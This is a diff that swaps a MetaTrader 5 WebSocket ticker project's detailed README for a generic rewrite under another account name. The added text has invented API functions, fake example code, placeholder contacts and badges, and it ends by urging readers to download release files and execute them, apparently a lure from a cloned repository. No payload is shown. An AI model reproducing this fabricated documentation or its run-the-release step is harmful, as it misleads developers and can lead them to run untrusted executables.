@@ -1,98 +1,138 @@
-# ⚡️ MetaTrader 5 + WebSockets + Real-time Ticker Messages
+# MetaTrader 5 WebSocket Tickers 🌐📈
 
-A solution for streaming real-time ticker updates from MetaTrader 5 over WebSockets to any server.
+![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue.svg) ![GitHub Issues](https://img.shields.io/badge/Issues-0-brightgreen.svg) ![GitHub Stars](https://img.shields.io/badge/Stars-0-yellow.svg)
 
-![Real-time Tickers](/Readme-assets/Tickers.gif)
+Welcome to the **MetaTrader 5 WebSocket Tickers** repository! This project offers a robust solution for streaming real-time ticker updates from MetaTrader 5 over WebSockets to any server. With this tool, you can enhance your trading applications and keep your data updated seamlessly.
 
-- 📘 Leverages the robust WebSocket library implementation from the MQL5 Book
-- ⚡️ Implements tight update intervals for near-zero latency ticker updates
-- 🚚 Batches ticker updates for symbols that changed within the same interval
-- 📚 Utilizes JAson library for JSON serialization/deserialization
+## Table of Contents
 
-Currently powering our trade signaling platform: [https://solidsignals.xyz](https://solidsignals.xyz) — Consistent Profitable Trades
-Written in MQL5, by polyclick
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Reference](#api-reference)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## Important Note
+## Features
 
-MetaTrader 5 restricts symbol tracking to those listed in the Market Watch window. When configuring the Expert Advisor, ensure that:
-1. All symbols you want to track are added to the Market Watch
-2. Symbol names in your configuration array match exactly with those in Market Watch
-3. Spelling is correct for all symbol names
+- **Real-Time Data**: Stream live ticker updates directly from MetaTrader 5.
+- **WebSocket Support**: Use WebSockets for efficient data transfer.
+- **Multi-Platform Compatibility**: Works with various server setups.
+- **Easy Integration**: Simple API for quick integration into your existing projects.
+- **Lightweight**: Minimal resource usage for optimal performance.
 
-## Setup Instructions
+## Getting Started
 
-### 1. Download this GitHub project
+To get started with the **MetaTrader 5 WebSocket Tickers**, you will need to set up your MetaTrader 5 environment and ensure that you have the necessary permissions to access the data.
 
-Shouldn't be too hard :)
+### Prerequisites
 
-### 2. Install the MQL5Book library
+- MetaTrader 5 installed on your machine.
+- Basic knowledge of MQL5 and WebSockets.
+- A server that can handle WebSocket connections.
 
-Place the `MQL5Book` directory in your MetaTrader 5 include directory:
+## Installation
+
+1. Clone the repository to your local machine:
+
+   ```bash
+   git clone https://github.com/mainpclab/metatrader5-websocket-tickers.git
+   ```
+
+2. Navigate to the project directory:
+
+   ```bash
+   cd metatrader5-websocket-tickers
+   ```
+
+3. Install any dependencies if required. Refer to the documentation of the libraries used in the project.
+
+## Usage
+
+To start streaming ticker updates, follow these steps:
+
+1. Open MetaEditor in MetaTrader 5.
+2. Create a new Expert Advisor (EA) and copy the provided MQL5 code into it.
+3. Compile the EA.
+4. Attach the EA to a chart in MetaTrader 5.
+5. Connect your WebSocket server to receive updates.
+
+### Example Code Snippet
+
+Here’s a simple example of how to set up the WebSocket connection in your EA:
+
+```mql5
+// Example MQL5 code
+void OnTick()
+{
+    // Your code to handle ticks
+    WebSocketSend("ticker_update", GetTickerData());
+}
 ```
-/MQL5/Include/MQL5Book
-```
 
-When installed correctly, your directory structure should look like this:
+### Connecting to Your Server
 
-![Include Directory Structure](/Readme-assets/Include.png)
+Make sure your WebSocket server is running and listening for connections. You can use tools like `wscat` to test the connection:
 
-### 3. Set up your Expert Advisor folder
-
-1. Create a custom Expert Advisor folder at `/MQL5/Experts/{YOUR_FOLDER_NAME}`
-2. Copy all files from the `Expert/` directory in this repo to your custom folder
-
-![Expert Directory Structure](/Readme-assets/Expert.png)
-
-### 4. Compile the Expert Advisor
-
-1. Open MetaEditor
-2. Compile the Expert Advisor
-3. Resolve any include path issues that may arise
-
-### 5. Whitelist WebSocket URL
-
-In MetaTrader 5:
-1. Navigate to Tools > Options
-2. Add your WebSocket server URL to the allowed URLs list
-
-![Whitelist Configuration](/Readme-assets/Whitelist.png)
-
-### 6. Attach the Expert Advisor to a chart
-
-Even though the Expert Advisor doesn't primarily use the `onTick()` event, it needs to be attached to a chart to initialize and run.
-
-Debug messages are included in the code to assist with troubleshooting.
-
-## Development Tools
-
-### Local WebSocket Server Setup
-
-For development and testing, you can create a temporary WebSocket server:
-
-1. Start a local WebSocket server using `wscat`:
 ```bash
-npx wscat -l 8080
+wscat -c ws://yourserver.com:port
 ```
 
-2. Expose your local server to the internet using `untun` (CloudFlare-based tunneling):
-```bash
-npx untun@latest tunnel http://localhost:8080
-```
+## API Reference
 
-![Tunnel Configuration](/Readme-assets/Tunnel.png)
+The API is designed to be straightforward. Here are the key functions you will use:
 
-3. Use the public URL provided by `untun` in:
-   - The MetaTrader 5 Tools > Options whitelist
-   - The Expert Advisor input parameters
+- `WebSocketSend(string event, string data)`: Sends data to the WebSocket server.
+- `GetTickerData()`: Retrieves the latest ticker data from MetaTrader 5.
 
-If connection fails, try these URL variations in both the whitelist and EA parameters:
-- `http://random-url.trycloudflare.com`
-- `https://random-url.trycloudflare.com`
-- `ws://random-url.trycloudflare.com`
-- `wss://random-url.trycloudflare.com`
+For more detailed documentation, please refer to the code comments and the Wiki section.
 
-## Support
+## Contributing
 
-- Open an issue on GitHub
-- Visit our website: [https://solidsignals.xyz](https://solidsignals.xyz)
-- Join our Discord community: [https://discord.gg/NMVSE5mGkX](https://discord.gg/NMVSE5mGkX)
+We welcome contributions! If you would like to help improve the project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your fork.
+5. Create a pull request.
+
+Please ensure that your code adheres to the coding standards used in the project.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **Email**: support@example.com
+- **Twitter**: [@example](https://twitter.com/example)
+
+## Releases
+
+To download the latest version, visit the [Releases](https://github.com/mainpclab/metatrader5-websocket-tickers/releases) section. You can download the necessary files and execute them to get started.
+
+For detailed release notes and updates, check the releases regularly.
+
+---
+
+This project is designed to make your trading experience smoother and more efficient. By using WebSockets, you can ensure that your applications receive data in real-time, allowing for better decision-making and improved performance.
+
+## Additional Resources
+
+- [MetaTrader 5 Documentation](https://www.metatrader5.com/en/terminal/help)
+- [MQL5 Documentation](https://www.mql5.com/en/docs)
+- [WebSocket API Documentation](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
+
+### Acknowledgments
+
+We thank the community for their support and contributions. Your feedback helps us improve this project.
+
+---
+
+Feel free to explore, contribute, and enhance your trading tools with **MetaTrader 5 WebSocket Tickers**!
